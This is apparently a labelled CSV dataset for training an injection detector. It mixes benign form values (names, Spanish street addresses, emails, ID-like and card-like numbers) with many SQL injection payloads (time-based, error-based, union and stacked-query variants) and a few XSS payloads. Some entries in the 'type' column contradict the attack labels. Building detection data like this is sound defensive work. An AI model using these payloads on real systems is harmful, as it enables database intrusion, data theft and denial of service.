Text,attack_type,Label,type
-se331rio,norm,0,normal
1')) or (select * from (select(sleep(5)))ydpu) and (('ckmm' like 'ckmm,sqli,1,sql
allegra,norm,0,normal
"1'||(select 'fraa' from dual where 9140=9140 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))||'",sqli,1,sql
00916150z,norm,0,normal
-6202)) or 7845=1962--,sqli,1,sql
-1192 order by 1#,sqli,1,normal
84950037c,norm,0,normal
coposes+or,norm,0,normal
august,norm,0,normal
"c/ general merry del val, s/n",norm,0,normal
3720111017724174,norm,0,normal
clariana de cardener,norm,0,normal
22147,norm,0,normal
"1%')) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (('%'='",sqli,1,sql
pamente,norm,0,normal
basedow@hiteurope.fo,norm,0,normal
"1"" or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
phelpr@eonon.com.pr,norm,0,normal
pesche@campodegolf.com.sy,norm,0,normal
1646619450025550,norm,0,normal
"1"")) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((""qnqb"" like ""qnqb",sqli,1,sql
"-5771')) union all select 2833,2833,2833,2833,2833,2833--",sqli,1,sql
condensador,norm,0,normal
56597686e,norm,0,normal
rocinante,norm,0,normal
"1');select count(*) from generate_series(1,5000000)--",sqli,1,sql
-3956') or (8459=8459)*4906 and ('rflo' like 'rflo,sqli,1,normal
"1%';select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"praza madre lestonnac, s/n",norm,0,normal
"1""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((""soyg""=""soyg",sqli,1,sql
"1)) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"1"") union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
08230,norm,0,normal
"1;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4-- sapi",sqli,1,sql
05296,norm,0,normal
beverly.lormer@decobiombo.ni,norm,0,normal
palacios del pan,norm,0,normal
"-8490)) union all select 6910,6910,6910,6910,6910,6910#",sqli,1,sql
"1"") union all select null,null,null,null,null,null,null--",sqli,1,sql
1')) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('jryo'='jryo,sqli,1,sql
demonlatra,norm,0,normal
olaughlin@pinkplanetplasencia.uy,norm,0,normal
masana molera,norm,0,normal
23l8noi7e,norm,0,normal
19134,norm,0,normal
4956996115343204,norm,0,normal
"1'+(select nvht where 9118=9118 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))+'",sqli,1,sql
"1%"" and 5411=7697 and ""%""=""",sqli,1,normal
klotz,norm,0,normal
colligan@nexuspark.dz,norm,0,normal
57i-9557a,norm,0,normal
"1 where 1062=1062 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
178,norm,0,normal
19416147f,norm,0,normal
"1"";if(7899=7899) select 7899 else drop function zbbp--",sqli,1,sql
villaseca de henares,norm,0,normal
08030,norm,0,normal
da silva kerber,norm,0,normal
"-1162"")) as mhmh where 8710=8710 or make_set(4822=7598,7598)--",sqli,1,sql
"-2149""))) or elt(1032=1032,3623) and (((""hoon"" like ""hoon",sqli,1,normal
93860343b,norm,0,normal
"1')) as uvxv where 6663=6663 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"-8021"") union all select 1166,1166,1166,1166--",sqli,1,sql
ilana,norm,0,normal
476en9o9na5,norm,0,normal
-8945)) as fszo where 2320=2320 union all select 2320--,sqli,1,sql
3798715775380607,norm,0,normal
17853323x,norm,0,normal
pollack,norm,0,normal
1') as pxcd where 9754=9754 or sleep(5)--,sqli,1,sql
"1 and 3824=benchmark(5000000,md5(0x76555642))# igen",sqli,1,normal
fryd garreta,norm,0,normal
tarsila,norm,0,normal
"c/ rodenas, 1",norm,0,normal
"pedrosa d 15, 7?a",norm,0,normal
"1 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)",sqli,1,normal
4478737902876743,norm,0,normal
34492,norm,0,normal
"1' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and 'eovg' like 'eovg",sqli,1,sql
"1%')) union all select null,null,null,null,null,null,null--",sqli,1,sql
1 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))-- knpw,sqli,1,sql
6608191382152819,norm,0,normal
"1"")) union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
-8729'+(select 'nbzl' where 7160=7160 order by 1#,sqli,1,sql
24711,norm,0,normal
mclawhor,norm,0,normal
"1') and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('cssb'='cssb",sqli,1,normal
1') and sleep(5)#,sqli,1,normal
42214,norm,0,normal
clint,norm,0,normal
"-3593%' union all select 6346,6346,6346,6346,6346,6346--",sqli,1,sql
regaladam_ente,norm,0,normal
95944263q,norm,0,normal
85009634r,norm,0,normal
drissel,norm,0,normal
"1');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",sqli,1,sql
3891909303541723,norm,0,normal
giridhar,norm,0,normal
suyay,norm,0,normal
gerald@magritte.bs,norm,0,normal
tu6e3a5a,norm,0,normal
ezequas,norm,0,normal
b*uba,norm,0,normal
"1'||(select 'mgel' where 3591=3591 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))||'",sqli,1,sql
16878,norm,0,normal
"frutos 65, 10?a",norm,0,normal
calle tresmall 154,norm,0,normal
1) where 6950=6950 rlike (select * from (select(sleep(5)))sgvo)--,sqli,1,sql
elliman.kane@doloresmusculares.tt,norm,0,normal
gilda6@mytanga.om,norm,0,normal
"1))) and make_set(8882=1593,1593) and (((7989=7989",sqli,1,normal
4226075197468359,norm,0,normal
4518310510128542,norm,0,normal
morande,norm,0,normal
larraul,norm,0,normal
villanueva del rosario,norm,0,normal
meloling,norm,0,normal
c4e32788ia,norm,0,normal
lag@xavipetit.lu,norm,0,normal
7ar82fa,norm,0,normal
8ap6l4984,norm,0,normal
embree_chevret@softwaremasservicio.bs,norm,0,normal
1');begin user_lock.sleep(5); end and ('rlux' like 'rlux,sqli,1,sql
f6n3abl4,norm,0,normal
utilla,norm,0,normal
vvido,norm,0,normal
"1) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",sqli,1,sql
"<table background=""javascript:alert('xss')"">",xss,2,xss
alienacin,norm,0,normal
calvin@espaciodelpintor.by,norm,0,normal
longoria aro,norm,0,normal
"1"")) as wfne where 8933=8933;select (case when (3855=3855) then 3855 else 1/(select 0) end)--",sqli,1,sql
44340,norm,0,normal
"1%') union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
bette-an,norm,0,normal
"1%'))) union all select null,null,null,null,null,null--",sqli,1,sql
3823811440410539,norm,0,normal
o.donnel,norm,0,normal
culinario,norm,0,normal
00863764e,norm,0,normal
uhlhorn,norm,0,normal
"1;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5-- mkoo",sqli,1,sql
1'||(select 'yezk' where 2097=2097;if(3593=3779) select 3593 else drop function qtqy--,sqli,1,sql
calle benifallim 97 10?e,norm,0,normal
76150645z,norm,0,normal
quijano,norm,0,normal
"1"";if(8812=7896) select 8812 else drop function xltk--",sqli,1,sql
1')) and 2832=4165--,sqli,1,sql
tersilio,norm,0,normal
"patio pico de aneto, 122 13-c",norm,0,normal
histri985ent0,norm,0,normal
"c/ pla des monestir 4, 2c",norm,0,normal
"1"")) union all select null,null,null,null,null,null,null--",sqli,1,sql
"1'+(select thmg where 2546=2546 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"avenida san francisco javier, 5,",norm,0,normal
"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",sqli,1,sql
steinbach@ballobar.com.tf,norm,0,normal
"1"" and 8407=(select count(*) from generate_series(1,5000000)) and ""eslo"" like ""eslo",sqli,1,sql
quintanalez,norm,0,normal
68169107m,norm,0,normal
"-4944%"")) or make_set(1084=1988,1988) and ((""%""=""",sqli,1,normal
"1%')) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"vall de bianya, la",norm,0,normal
"1%' and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and '%'='",sqli,1,sql
martinsan.broughton@etxarriaranatz.ck,norm,0,normal
">""<div style=""width: expression(document.cookie=true);"">",xss,2,sql
"camino san jaime 97,",norm,0,normal
caudete,norm,0,normal
"-4934"" union all select 5119,5119,5119,5119,5119--",sqli,1,sql
lasheras canizales,norm,0,normal
llaga,norm,0,normal
sabedora,norm,0,normal
c/ crevillente 63,norm,0,normal
-1432 order by 1#,sqli,1,normal
izzi barnils,norm,0,normal
"1"" and (7597=8422)*8422 and ""gywp"" like ""gywp",sqli,1,normal
botosso@mytanga.cf,norm,0,normal
"1);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,1,sql
457l0m3t46,norm,0,normal
"c/ bascuana 52, 5-e",norm,0,normal
avinguda de madrid 125 12e,norm,0,normal
1')));begin dbms_lock.sleep(5); end--,sqli,1,sql
l9n0e7no,norm,0,normal
karkotsk,norm,0,normal
"1"")) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((""mjkl""=""mjkl",sqli,1,sql
c/ cardenal benilloch 171 12?h,norm,0,normal
"-2849' union all select 6491,6491,6491,6491,6491,6491,6491--",sqli,1,sql
dowson@sehimaco.eg,norm,0,normal
"1') and 8407=(select count(*) from generate_series(1,5000000))",sqli,1,sql
6735120174672255,norm,0,normal
9593063856723966,norm,0,normal
judas,norm,0,normal
cedric,norm,0,normal
raian,norm,0,normal
p6r23i.co,norm,0,normal
"-5800"") or 6872=6872 and (""tcab"" like ""tcab",sqli,1,normal
puente de gnave,norm,0,normal
abdul-sa,norm,0,normal
9041,norm,0,normal
camisoln,norm,0,normal
parman,norm,0,normal
lihul,norm,0,normal
2244921574247376,norm,0,normal
812,norm,0,normal
"1"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""zlal""=""zlal",sqli,1,sql
"calle reina violante, 35,",norm,0,normal
5763287543160416,norm,0,normal
"1') and elt(4249=4249,7259) and ('bxnn'='bxnn",sqli,1,normal
"1') as ohcs where 9588=9588 or elt(6272=6272,sleep(5))--",sqli,1,sql
en8og1da,norm,0,normal
"1) where 2020=2020 and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
perla,norm,0,normal
casanellas berlingery,norm,0,normal
d76en3r9n8z01,norm,0,normal
"calle torrefina 127, 9-d",norm,0,normal
2j2st1,norm,0,normal
5939892220484174,norm,0,normal
"-2430') union all select 5712,5712,5712,5712,5712,5712,5712,5712,5712,5712--",sqli,1,sql
codo,norm,0,normal
"1"")) and 7533=7533 and ((""gkca""=""gkca",sqli,1,normal
"-7255' union all select 2127,2127,2127,2127,2127#",sqli,1,sql
"1"") or elt(6272=6272,sleep(5)) and (""fvrq""=""fvrq",sqli,1,normal
97531792q,norm,0,normal
volonghi@tacticlinks.com.bn,norm,0,normal
1%');(select * from (select(sleep(5)))srmq) and ('%'=',sqli,1,sql
34853143r,norm,0,normal
"1"") and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (""pfea""=""pfea",sqli,1,sql
86274990n,norm,0,normal
"-8709"" or 8571=8571--",sqli,1,sql
"-4764) where 8200=8200 union all select 8200,8200,8200,8200--",sqli,1,sql
"1 where 8908=8908 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
anjali,norm,0,normal
43823011f,norm,0,normal
i39str845vo,norm,0,normal
"1' where 4039=4039 union all select null,null,null,null,null,null,null,null--",sqli,1,sql
23790,norm,0,normal
"1')) and 8407=(select count(*) from generate_series(1,5000000)) and (('bzak' like 'bzak",sqli,1,sql
villabez,norm,0,normal
hampton-bourne@soyandaluz.lv,norm,0,normal
"1') where 5317=5317 and 8407=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
1'+(select 'jmdl' where 7827=7827;select pg_sleep(5))+',sqli,1,sql
73488403e,norm,0,normal
kops@estarencasa.bb,norm,0,normal
"1)) as yfvg where 1454=1454 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",sqli,1,sql
"-6400)) union all select 4650,4650,4650--",sqli,1,sql
cebuano,norm,0,normal
kuzz,norm,0,normal
"-8794))) union all select 5802,5802,5802--",sqli,1,sql
"1))) union all select null,null,null,null,null,null,null,null#",sqli,1,sql
jernima,norm,0,normal
1' in boolean mode) rlike sleep(5)#,sqli,1,normal
mohedano tinoco,norm,0,normal
plu1baginceo,norm,0,normal
"1"") as mszg where 6184=6184 rlike sleep(5)--",sqli,1,sql
salamanca,norm,0,normal
ulldecona,norm,0,normal
"-1915%"")) union all select 7732,7732,7732,7732,7732,7732,7732,7732,7732#",sqli,1,sql
50604841b,norm,0,normal
sensualmente,norm,0,normal
"<img src=javascript:alert(string.fromcharcode(88,83,83))>",xss,2,xss
fuencaliente de la palma,norm,0,normal
"1%'));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('%'='",sqli,1,sql
1519,norm,0,normal
80216904b,norm,0,normal
"1')) or elt(5873=5873,sleep(5))#",sqli,1,normal
"1') or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ('lbwh'='lbwh",sqli,1,sql
menospreciativo,norm,0,normal
49645694x,norm,0,normal
"1);select count(*) from generate_series(1,5000000)",sqli,1,sql
"1""))) and 6969=(select 6969 from pg_sleep(5)) and (((""ipqw"" like ""ipqw",sqli,1,sql
"-5732') union all select 7614,7614,7614,7614--",sqli,1,sql
"c/ norte 9,",norm,0,normal
galligan@bijoubijoudiferente.vg,norm,0,normal
8175930764478311,norm,0,normal
1'||(select 'ylio' from dual where 3767=3767 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))||',sqli,1,sql
"1"" where 8918=8918 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",sqli,1,sql
"1')) as tcby where 5213=5213;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
montesa,norm,0,normal
7043,norm,0,normal
45314,norm,0,normal
2589729012586382,norm,0,normal
1600011664845261,norm,0,normal
"nucleo santiago apostol 34, 4?f",norm,0,normal
ivars d'urgell,norm,0,normal
"1')) as yqek where 1957=1957;iif(5257=5257,1,1/0)",sqli,1,sql
maximinio,norm,0,normal
marg,norm,0,normal
"1'))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('akyc'='akyc",sqli,1,normal
"""data:text/html;base64,phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==""></embed>",xss,2,sql
mariana,norm,0,normal
"1%') and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('%'='",sqli,1,normal
garrudo castellon,norm,0,normal
1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and 'pziy'='pziy,sqli,1,sql
erikson@elcarritodelacompra.gw,norm,0,normal
7144713031308851,norm,0,normal
patey@suncorp.st,norm,0,normal
"1"") rlike sleep(5)#",sqli,1,normal
-2456'))) or (8459=8459)*4906 and ((('bbkp'='bbkp,sqli,1,normal
"arroyo prado del rey 60,",norm,0,normal
biosca,norm,0,normal
45280,norm,0,normal
nelson@coreserv.cf,norm,0,normal
48p81o0oo,norm,0,normal
1)) as kccx where 7547=7547 union all select null--,sqli,1,sql
7841490490898807,norm,0,normal
"calle andavias s/n,",norm,0,normal
"1') or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
brun canalis,norm,0,normal
414rd7f132o,norm,0,normal
"-1263"") or 9323=9323#",sqli,1,normal
"-9958"") as jzvq where 3741=3741 union all select 3741,3741,3741#",sqli,1,sql
otowa@ebuy.com.ci,norm,0,normal
47419,norm,0,normal
47361,norm,0,normal
ana,norm,0,normal
brownfie,norm,0,normal
22513,norm,0,normal
95105299t,norm,0,normal
f4lf7,norm,0,normal
maughan@enfuerteventura.com.rw,norm,0,normal
37160,norm,0,normal
rinconada valentin gonzalez 70,norm,0,normal
4796381600285073,norm,0,normal
albea,norm,0,normal
1') as epgz where 2898=2898 and 7028=2287#,sqli,1,normal
guango,norm,0,normal
nepor-leonov@telogis.bn,norm,0,normal
espls,norm,0,normal
"1' where 8437=8437 and make_set(8403=8403,8899)--",sqli,1,sql
"""alert(1)"">",xss,2,normal
-1127 or 7391=4954,sqli,1,normal
3742884361976074,norm,0,normal
"1',(case when 8260=8260 then 1 else null end)",sqli,1,normal
tiziano,norm,0,normal
3419068055931419,norm,0,normal
43320,norm,0,normal
"1"")) as yutu where 1306=1306 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",sqli,1,sql
"-7499%"") union all select 1893,1893,1893,1893,1893#",sqli,1,sql
1' in boolean mode) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)#,sqli,1,sql
"1' where 5801=5801 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",sqli,1,sql
1 where 5311=5311 rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
"1"")) or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
"1'||(select 'mwmn' where 5112=5112 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a))||'",sqli,1,sql
42172,norm,0,normal
"1'+(select 'vfkl' where 1713=1713 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))+'",sqli,1,sql
"montblanc 86, 12?d",norm,0,normal
-2174')) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (('dyyg'='dyyg,sqli,1,sql
42367,norm,0,normal
33987,norm,0,normal
"1""))) and sleep(5) and (((""fdvc"" like ""fdvc",sqli,1,normal
"c/ curadero, 101, 12?e",norm,0,normal
598le65,norm,0,normal
bret3,norm,0,normal
"calle mitjana, 83, 8b",norm,0,normal
"1')) and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"1'||(select 'cqjw' from dual where 7335=7335 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))||'",sqli,1,sql
galatas,norm,0,normal
1) and 9198=9198--,sqli,1,sql
"1' in boolean mode);select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
armintario,norm,0,normal
adelmar,norm,0,normal
nardo,norm,0,normal
marcos,norm,0,normal
1) where 2468=2468 and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
1'+(select 'vddk' where 6961=6961;if(4194=4133) select 4194 else drop function tqhz--,sqli,1,sql
"c/ el breton, 187",norm,0,normal
84,norm,0,normal
"1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('nuil' like 'nuil",sqli,1,normal
"1""))) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
riggsbee,norm,0,normal
4132414285335498,norm,0,normal
"1""))) or 8466=benchmark(5000000,md5(0x694a4745)) and (((""hiwo"" like ""hiwo",sqli,1,normal
"1"") where 5938=5938 and (select * from (select(sleep(5)))gcrr)#",sqli,1,sql
fernn caballero,norm,0,normal
"1;call regexp_substring(repeat(right(char(3702),0),500000000),null)# huhw",sqli,1,sql
"1"")) as upvg where 4826=4826;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
15618,norm,0,normal
5568778491902564,norm,0,normal
"calle san sebastian, 154 13d",norm,0,normal
barba crous,norm,0,normal
1'||(select 'awba' from dual where 3749=3749 and 1445=3334--,sqli,1,sql
riego,norm,0,normal
47400,norm,0,normal
9475732136741046,norm,0,normal
"1') where 9304=9304 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
batchoun,norm,0,normal
00947908d,norm,0,normal
"alamedilla, la",norm,0,normal
1;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
"1;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg",sqli,1,sql
"1) where 1880=1880 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
fancelli joral,norm,0,normal
"1'))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((('skdy'='skdy",sqli,1,normal
"1%"" or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""%""=""",sqli,1,sql
anderton,norm,0,normal
segura de los baos,norm,0,normal
cuarter8da,norm,0,normal
"calle francisco de leiva, 131,",norm,0,normal
"torrejon de velasco, 129",norm,0,normal
"1' where 1031=1031 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",sqli,1,sql
"1""))) and make_set(7809=9564,9564) and (((""jggk"" like ""jggk",sqli,1,normal
78218686x,norm,0,normal
5400,norm,0,normal
1 order by 1--,sqli,1,sql
9054,norm,0,normal
calle vallseca 123,norm,0,normal
"1%"")) or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
macduff,norm,0,normal
"1"") or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""oxxi""=""oxxi",sqli,1,sql
dubarry@soyrojo.tr,norm,0,normal
"make_set(5679=9769,9769)",sqli,1,normal
"-9082 union all select 9858,9858,9858,9858,9858,9858--",sqli,1,sql
d895ra8,norm,0,normal
estrad sivelli,norm,0,normal
awad@colorprint.nc,norm,0,normal
"-6593"") union all select 6216,6216,6216,6216,6216,6216,6216#",sqli,1,sql
selwart@studentrooms.zr,norm,0,normal
"1 where 2823=2823 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"-1<input type=""image"" dynsrc=""javascript:document.cookie=true;"">",xss,2,xss
49440,norm,0,normal
abdollah,norm,0,normal
"passatge joan casas 152, 4c",norm,0,normal
1'||(select 'tzxr' from dual where 2934=2934 and 4595=4595#,sqli,1,sql
1') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('izyf'='izyf,sqli,1,sql
rodrigo velazquez,norm,0,normal
"1"");select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""unju""=""unju",sqli,1,sql
e7ato,norm,0,normal
2473105316988907,norm,0,normal
"calle alfaz del pi, 96 11?d",norm,0,normal
merkling,norm,0,normal
ahern.plott@zonamodelos.fr,norm,0,normal
nieva de cameros,norm,0,normal
mkpwent,norm,0,normal
cufre sans,norm,0,normal
"<table><td background=""javascript:alert('crosssitescripting')"">",xss,2,xss
seto,norm,0,normal
royo mascarell,norm,0,normal
portillo,norm,0,normal
1'||(select 'tjzy' where 3037=3037;select sleep(5))||',sqli,1,sql
harmonia 120,norm,0,normal
15990,norm,0,normal
"-3492"" where 4094=4094 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",sqli,1,sql
"1')) as gqzy where 2312=2312 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (('wyvx'='wyvx",sqli,1,sql
"1') as sjij where 8659=8659;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
dziawa,norm,0,normal
"<img src=javascript:alert(""crosssitescripting"")>",xss,2,xss
"calle arquitectura, 160,",norm,0,normal
4122797587162941,norm,0,normal
19133,norm,0,normal
uribitarte 72 13?g,norm,0,normal
46006466a,norm,0,normal
roehn.kernke@eldeseodepecar.ec,norm,0,normal
7907782578566170,norm,0,normal
1i6osa,norm,0,normal
"-1<img style=""crosssitescripting:expr/*crosssitescripting*/ession(document.cookie=true)"">",xss,2,sql
"1')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
5458137818336951,norm,0,normal
"estrada mendiarte s/n, 10?a",norm,0,normal
symen,norm,0,normal
de1l2nda9ur4,norm,0,normal
"1%"")));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (((""%""=""",sqli,1,sql
"1 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)# hlrg",sqli,1,sql
"1%' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and '%'='",sqli,1,sql
"1"") as xaye where 5343=5343 and 4355=7475#",sqli,1,normal
"-6407') or elt(1631=4946,4946) and ('jpnz'='jpnz",sqli,1,normal
229i9967te,norm,0,normal
<script>a=/crosssitescripting/ alert(a.source)</script>,xss,2,xss
